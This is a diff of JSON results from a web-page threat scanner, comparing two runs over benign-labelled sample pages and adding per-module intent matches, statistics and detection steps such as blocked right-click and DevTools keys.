-  "analyzed_at": "2026-10-18T00:01:49.790821+05:30",
+  "analyzed_at": "2026-10-21T08:25:57.886546+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -10922,7 +12757,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -10960,7 +12798,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 74.0,
+     "page_text_chars": 2233.0,
+     "language_confidence": 0.7835,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -10983,7 +12831,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 11.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 2.0,
+     "sinks_total": 5.0,
+     "flows_total": 1.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -11063,24 +12923,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 57.4,
-   "quality": 24.7,
-   "dom_features": 16.8,
-   "dom_model": 31.4,
-   "content": 36.5,
-   "text_models": 354.5,
-   "js_analysis": 12.4,
-   "behavior": 14.0,
-   "behavior_model": 30.2,
+   "preprocess": 44.9,
+   "quality": 27.4,
+   "dom_features": 17.4,
+   "dom_model": 35.6,
+   "content": 51.4,
+   "text_models": 367.6,
+   "js_analysis": 12.6,
+   "behavior": 11.8,
+   "behavior_model": 33.5,
    "fusion": 0.1,
-   "total": 579.2
+   "total": 611.3
   }
  },
  "24": {
-  "analysis_id": "ce2ce80dfeb64a4dae641bfe845bf010",
+  "analysis_id": "34e5e9d719664b3e8875e93f5c538b19",
   "request_id": "c2_benign_000122",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:49.190124+05:30",
+  "analyzed_at": "2026-10-21T08:25:57.253482+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -11164,7 +13024,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -11202,7 +13065,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 2.0,
+     "page_text_chars": 202.0,
+     "language_confidence": 0.8946,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -11225,7 +13098,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 1.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 4.0,
+     "sources_total": 4.0,
+     "sinks_total": 1.0,
+     "flows_total": 1.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -11305,24 +13190,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 1.9,
-   "quality": 1.2,
-   "dom_features": 0.7,
-   "dom_model": 32.5,
+   "preprocess": 2.2,
+   "quality": 1.4,
+   "dom_features": 0.9,
+   "dom_model": 32.9,
    "content": 1.4,
-   "text_models": 58.3,
-   "js_analysis": 4.2,
-   "behavior": 2.2,
-   "behavior_model": 36.4,
+   "text_models": 56.0,
+   "js_analysis": 5.6,
+   "behavior": 3.1,
+   "behavior_model": 37.1,
    "fusion": 0.1,
-   "total": 139.5
+   "total": 143.4
   }
  },
  "23": {
-  "analysis_id": "cda2f852444545a69e10edb13f9949c0",
+  "analysis_id": "58cf133e75034f1ab8df3a1d423f9e40",
   "request_id": "c2_benign_000118",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:49.036982+05:30",
+  "analyzed_at": "2026-10-21T08:25:57.093715+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -11356,7 +13241,20 @@
     "detail": "Anti-analysis (2 techniques): right-click blocked, text selection blocked.",
     "evidence": "document.addEventListener('contextmenu', function(event) { event.preventDefault(); })",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "detection",
+      "line": 3,
+      "code": "document.addEventListener('contextmenu', function(event) { event.preventDefault(); })",
+      "note": "contextmenu_listener"
+     },
+     {
+      "kind": "detection",
+      "line": 13,
+      "code": "document.addEventListener('selectstart', function(event) { event.preventDefault(); })",
+      "note": "selection"
+     }
+    ]
    },
    {
     "id": "dom.form_action_empty_or_js",
@@ -11405,7 +13303,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -11443,7 +13344,29 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "impersonation",
+      "display": "impersonation",
+      "method": "cue_words",
+      "severity": null,
+      "count": 1,
+      "cues": [
+       "පොලිසිය"
+      ],
+      "example": "නෑ නෑ කවුරුවත් කිව්වට අපි දන්නවනේ.තුවක්කු උදුර ගත්තා.මුලට හිටපු පොලිසියේ තුවක් උදුර ගත්තා.එල්.ටී.ටී ඊ කාරයෝ වගේ බෝම්බ ගැහුවේ නෑ.ඔය නිරංජන්නේ කියන්නේ යනුවෙන් ද…"
+     }
+    ],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 130.0,
+     "page_text_chars": 2997.0,
+     "language_confidence": 0.7944,
+     "si_script_ratio": 0.6775,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.3225
+    }
    },
    "behavior": {
     "status": "ok",
@@ -11468,7 +13391,29 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "anti_analysis",
+      "display": "Anti-analysis",
+      "method": "ast_source_sink",
+      "severity": "medium",
+      "count": 2,
+      "cues": [],
+      "example": "Anti-analysis (2 techniques): right-click blocked, text selection blocked."
+     }
+    ],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 47.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 3.0,
+     "sources_total": 3.0,
+     "sinks_total": 3.0,
+     "flows_total": 2.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 10.0
+    }
    }
   },
   "explanation": {
@@ -11550,24 +13495,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 58.2,
-   "quality": 25.7,
-   "dom_features": 17.2,
-   "dom_model": 29.8,
-   "content": 28.4,
-   "text_models": 366.7,
-   "js_analysis": 22.3,
-   "behavior": 24.4,
-   "behavior_model": 29.9,
+   "preprocess": 35.0,
+   "quality": 21.8,
+   "dom_features": 18.4,
+   "dom_model": 29.3,
+   "content": 37.0,
+   "text_models": 370.8,
+   "js_analysis": 22.5,
+   "behavior": 24.8,
+   "behavior_model": 32.3,
    "fusion": 0.1,
-   "total": 604.0
+   "total": 610.2
   }
  },
  "22": {
-  "analysis_id": "ae50c75818584988b7b1314b0cebafa8",
+  "analysis_id": "045733ae81a847fd8cb3f22f5fab9d16",
   "request_id": "c2_benign_000109",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:48.411325+05:30",
+  "analyzed_at": "2026-10-21T08:25:56.469959+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -11601,7 +13546,20 @@
     "detail": "Anti-analysis (2 techniques): right-click blocked, DevTools keys blocked.",
     "evidence": "document.addEventListener('contextmenu', function(e) { e.preventDefault(); })",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "detection",
+      "line": 3,
+      "code": "document.addEventListener('contextmenu', function(e) { e.preventDefault(); })",
+      "note": "contextmenu_listener"
+     },
+     {
+      "kind": "detection",
+      "line": 8,
+      "code": "function(e) { // Disable F12 if (e.keyCode == 123) { return false; } // Disable Ctrl+Shift+I if (e.ctrlKey && e.shift...",
+      "note": "F12, Ctrl+Shift+I/J/C, Ctrl+U"
+     }
+    ]
    },
    {
     "id": "content.urgency",
@@ -11648,7 +13606,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -11688,7 +13649,42 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "fake_reward",
+      "display": "fake reward",
+      "method": "cue_words",
+      "severity": null,
+      "count": 1,
+      "cues": [
+       "இலவச"
+      ],
+      "example": "விசேட செய்திகள்,விசேட கட்டுரைகள், குறுந்தகவல் செய்திகள், நாளாந்த வீரகேசரி பத்திரிகை, வாராந்த செய்தி மடல், வலையொலி (Podcast), வீடியோ தொகுப்பு போன்றவற்றை இலவசமாக…"
+     },
+     {
+      "intent": "urgency_threat",
+      "display": "urgency threat",
+      "method": "cue_words",
+      "severity": null,
+      "count": 3,
+      "cues": [
+       "இடைநிறுத்த",
+       "உடனடியாக",
+       "உடனே"
+      ],
+      "example": "சவூதி அரேபியாவின் தம்மாம் நகருக்கான ஸ்ரீலங்கன் எயார்லைன்ஸ் விமான சேவைகள் 18 வரை இடைநிறுத்தம்"
+     }
+    ],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 267.0,
+     "page_text_chars": 2992.0,
+     "language_confidence": 0.8869,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.8784,
+     "latin_script_ratio": 0.1216
+    }
    },
    "behavior": {
     "status": "ok",
@@ -11713,7 +13709,29 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "anti_analysis",
+      "display": "Anti-analysis",
+      "method": "ast_source_sink",
+      "severity": "medium",
+      "count": 2,
+      "cues": [],
+      "example": "Anti-analysis (2 techniques): right-click blocked, DevTools keys blocked."
+     }
+    ],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 7.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 2.0,
+     "sources_total": 4.0,
+     "sinks_total": 4.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 10.0
+    }
    }
   },
   "explanation": {
@@ -11795,24 +13813,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 284.1,
-   "quality": 37.4,
-   "dom_features": 31.7,
-   "dom_model": 20.8,
-   "content": 72.9,
-   "text_models": 340.4,
-   "js_analysis": 4.0,
-   "behavior": 1.9,
-   "behavior_model": 31.8,
+   "preprocess": 299.7,
+   "quality": 39.0,
+   "dom_features": 34.2,
+   "dom_model": 24.1,
+   "content": 83.9,
+   "text_models": 366.9,
+   "js_analysis": 4.1,
+   "behavior": 2.0,
+   "behavior_model": 33.9,
    "fusion": 0.1,
-   "total": 827.3
+   "total": 922.3
   }
  },
  "21": {
-  "analysis_id": "a33f12b58ca24e349961fb1e702a0681",
+  "analysis_id": "ffc1b7aaeb444b8e8432b9db19203a74",
   "request_id": "c2_benign_000097",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:47.561715+05:30",
+  "analyzed_at": "2026-10-21T08:25:55.523954+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -11895,7 +13913,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -11935,7 +13956,40 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "fake_reward",
+      "display": "fake reward",
+      "method": "cue_words",
+      "severity": null,
+      "count": 1,
+      "cues": [
+       "prize"
+      ],
+      "example": "Profound's $1.8 billion valuation grabbed the headlines, but a crowded field of AI search startups is chasing the same prize: getting brands into AI answers."
+     },
+     {
+      "intent": "urgency_threat",
+      "display": "urgency threat",
+      "method": "cue_words",
+      "severity": null,
+      "count": 1,
+      "cues": [
+       "urgent"
+      ],
+      "example": "How MLB Made an Urgent Pitch to Fans for the 2026 Playoffs"
+     }
+    ],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 146.0,
+     "page_text_chars": 2999.0,
+     "language_confidence": 0.8207,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -11958,7 +14012,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 25.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 2.0,
+     "sources_total": 3.0,
+     "sinks_total": 2.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -12038,24 +14104,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 91.6,
-   "quality": 40.3,
-   "dom_features": 31.3,
-   "dom_model": 21.4,
-   "content": 54.7,
-   "text_models": 342.8,
-   "js_analysis": 38.2,
-   "behavior": 66.1,
-   "behavior_model": 32.9,
+   "preprocess": 84.2,
+   "quality": 39.8,
+   "dom_features": 32.3,
+   "dom_model": 21.5,
+   "content": 44.5,
+   "text_models": 370.1,
+   "js_analysis": 40.8,
+   "behavior": 69.8,
+   "behavior_model": 33.5,
    "fusion": 0.1,
-   "total": 721.4
+   "total": 761.2
   }
  },
  "20": {
-  "analysis_id": "cf8d6b3eb708495583a9fff7922cfcf4",
+  "analysis_id": "2c7c663ccb114842a8369b07669308ab",
   "request_id": "c2_benign_000091",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:46.818261+05:30",
+  "analyzed_at": "2026-10-21T08:25:54.741676+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -12116,7 +14182,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -12154,7 +14223,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 82.0,
+     "page_text_chars": 2999.0,
+     "language_confidence": 0.908,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -12177,7 +14256,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 3.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 4.0,
+     "sinks_total": 3.0,
+     "flows_total": 3.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -12257,24 +14348,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 22.8,
-   "quality": 8.6,
-   "dom_features": 5.1,
-   "dom_model": 33.0,
-   "content": 31.0,
-   "text_models": 341.8,
-   "js_analysis": 2.4,
-   "behavior": 2.2,
-   "behavior_model": 31.5,
+   "preprocess": 13.5,
+   "quality": 6.7,
+   "dom_features": 5.5,
+   "dom_model": 34.7,
+   "content": 34.0,
+   "text_models": 360.1,
+   "js_analysis": 2.1,
+   "behavior": 1.9,
+   "behavior_model": 30.1,
    "fusion": 0.1,
-   "total": 479.7
+   "total": 519.4
   }
  },
  "19": {
-  "analysis_id": "03548f84f406424893d1e3651e11a926",
+  "analysis_id": "df9d5ff455f44abfb8f8b4fa860f6292",
   "request_id": "c2_benign_000087",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:46.316902+05:30",
+  "analyzed_at": "2026-10-21T08:25:54.206404+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -12335,7 +14426,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -12373,7 +14467,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 76.0,
+     "page_text_chars": 2447.0,
+     "language_confidence": 0.6193,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.9616
+    }
    },
    "behavior": {
     "status": "ok",
@@ -12396,7 +14500,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 10.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -12476,24 +14592,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 28.7,
-   "quality": 16.1,
-   "dom_features": 13.2,
-   "dom_model": 29.6,
-   "content": 19.1,
-   "text_models": 356.3,
-   "js_analysis": 3.6,
-   "behavior": 2.5,
-   "behavior_model": 33.3,
+   "preprocess": 27.1,
+   "quality": 13.8,
+   "dom_features": 11.6,
+   "dom_model": 33.4,
+   "content": 22.1,
+   "text_models": 379.7,
+   "js_analysis": 3.9,
+   "behavior": 2.6,
+   "behavior_model": 32.4,
    "fusion": 0.1,
-   "total": 503.4
+   "total": 536.4
   }
  },
  "18": {
-  "analysis_id": "28265d9678ef4296a7f5897031eab097",
+  "analysis_id": "bb1534a94a4745b9aa0f4e97f15b8215",
   "request_id": "c2_benign_000083",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:45.794720+05:30",
+  "analyzed_at": "2026-10-21T08:25:53.654273+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -12598,7 +14714,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -12638,7 +14757,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 120.0,
+     "page_text_chars": 2994.0,
+     "language_confidence": 0.8461,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -12661,7 +14790,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 0.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -12741,24 +14882,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 125.9,
-   "quality": 82.6,
-   "dom_features": 78.8,
-   "dom_model": 21.1,
-   "content": 70.4,
-   "text_models": 357.7,
-   "js_analysis": 1.8,
+   "preprocess": 118.9,
+   "quality": 86.0,
+   "dom_features": 76.0,
+   "dom_model": 23.5,
+   "content": 83.1,
+   "text_models": 363.9,
+   "js_analysis": 1.3,
    "behavior": 0.3,
-   "behavior_model": 36.4,
+   "behavior_model": 33.3,
    "fusion": 0.1,
-   "total": 781.3
+   "total": 807.5
   }
  },
  "17": {
-  "analysis_id": "f3e286b49f9d474890f47da465936022",
+  "analysis_id": "c9a1a96cdf6644c583c4f1064191bdc1",
   "request_id": "c2_benign_000077",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:44.984048+05:30",
+  "analyzed_at": "2026-10-21T08:25:52.820113+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -12842,7 +14983,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -12880,7 +15024,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 316.0,
+     "page_text_chars": 2998.0,
+     "language_confidence": 0.9035,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -12903,7 +15057,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 26.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 1.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -12983,24 +15149,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 156.0,
-   "quality": 86.1,
-   "dom_features": 66.6,
-   "dom_model": 22.1,
-   "content": 126.7,
-   "text_models": 355.9,
-   "js_analysis": 2.1,
-   "behavior": 1.4,
-   "behavior_model": 30.5,
+   "preprocess": 160.5,
+   "quality": 84.4,
+   "dom_features": 65.7,
+   "dom_model": 25.7,
+   "content": 118.2,
+   "text_models": 362.4,
+   "js_analysis": 2.9,
+   "behavior": 2.0,
+   "behavior_model": 32.1,
    "fusion": 0.1,
-   "total": 852.0
+   "total": 903.7
   }
  },
  "16": {
-  "analysis_id": "5206d4425ffa435e9250a37a77cc7d12",
+  "analysis_id": "b8e9c8719ed2444f978d53388f56aee6",
   "request_id": "c2_benign_000076",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:44.104678+05:30",
+  "analyzed_at": "2026-10-21T08:25:51.888066+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -13061,7 +15227,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -13099,7 +15268,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 24.0,
+     "page_text_chars": 362.0,
+     "language_confidence": 0.9654,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.0346
+    }
    },
    "behavior": {
     "status": "ok",
@@ -13122,7 +15301,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 1.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 1.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -13202,24 +15393,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 3.6,
+   "preprocess": 3.8,
    "quality": 1.4,
    "dom_features": 1.0,
-   "dom_model": 20.3,
+   "dom_model": 23.0,
    "content": 2.6,
-   "text_models": 191.0,
+   "text_models": 199.6,
    "js_analysis": 0.5,
    "behavior": 0.4,
-   "behavior_model": 31.6,
+   "behavior_model": 31.4,
    "fusion": 0.1,
-   "total": 253.0
+   "total": 266.3
   }
  },
  "15": {
-  "analysis_id": "d6e73293196f4e74905c9e6a3ffdbd39",
+  "analysis_id": "f0271e34925d42bfb023f8abdccc2231",
   "request_id": "c2_benign_000071",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:43.838076+05:30",
+  "analyzed_at": "2026-10-21T08:25:51.608288+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -13344,7 +15535,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -13384,7 +15578,51 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "fake_security_warning",
+      "display": "fake security warning",
+      "method": "cue_words",
+      "severity": null,
+      "count": 1,
+      "cues": [
+       "tech support"
+      ],
+      "example": "\"We paid top dollar for a domain we had been waiting to obtain for a while, Atom made the payment and transfer painless and swift. Even with the delay of waiti…"
+     },
+     {
+      "intent": "fake_reward",
+      "display": "fake reward",
+      "method": "cue_words",
+      "severity": null,
+      "count": 1,
+      "cues": [
+       "winner"
+      ],
+      "example": "\"I used Atom[.]com for the first time and had the best experience. The platform was very easy to use, I got almost 2,000 entries from creatives. I loved that the…"
+     },
+     {
+      "intent": "urgency_threat",
+      "display": "urgency threat",
+      "method": "cue_words",
+      "severity": null,
+      "count": 2,
+      "cues": [
+       "within 24 hours"
+      ],
+      "example": "\"Easy and quick. I decided to lease a domain in a very competitive niche. Within 24 hours, I was able to update nameserver and customer support is top notch as…"
+     }
+    ],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 353.0,
+     "page_text_chars": 2994.0,
+     "language_confidence": 0.7606,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -13407,7 +15645,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 37.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 19.0,
+     "sinks_total": 8.0,
+     "flows_total": 11.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -13487,24 +15737,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 171.6,
-   "quality": 83.8,
-   "dom_features": 287.4,
-   "dom_model": 24.7,
-   "content": 128.1,
-   "text_models": 347.1,
-   "js_analysis": 139.7,
-   "behavior": 675.2,
-   "behavior_model": 24.2,
+   "preprocess": 161.5,
+   "quality": 85.1,
+   "dom_features": 275.6,
+   "dom_model": 21.5,
+   "content": 126.1,
+   "text_models": 366.3,
+   "js_analysis": 135.7,
+   "behavior": 660.1,
+   "behavior_model": 22.6,
    "fusion": 0.1,
-   "total": 1885.0
+   "total": 1887.0
   }
  },
  "14": {
-  "analysis_id": "385f6536dde34d6fa7b6f88d79cb52ca",
+  "analysis_id": "b4165c43dd584c65ac0c06157ee3fb5c",
   "request_id": "c2_benign_000069",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:41.938591+05:30",
+  "analyzed_at": "2026-10-21T08:25:49.704448+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -13577,7 +15827,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -13615,7 +15868,29 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "investment_lure",
+      "display": "investment lure",
+      "method": "cue_words",
+      "severity": null,
+      "count": 4,
+      "cues": [
+       "roi"
+      ],
+      "example": "Appier | Empowering Businesses to Turn AI into ROI"
+     }
+    ],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 135.0,
+     "page_text_chars": 2982.0,
+     "language_confidence": 0.8571,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.9984
+    }
    },
    "behavior": {
     "status": "ok",
@@ -13638,7 +15913,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
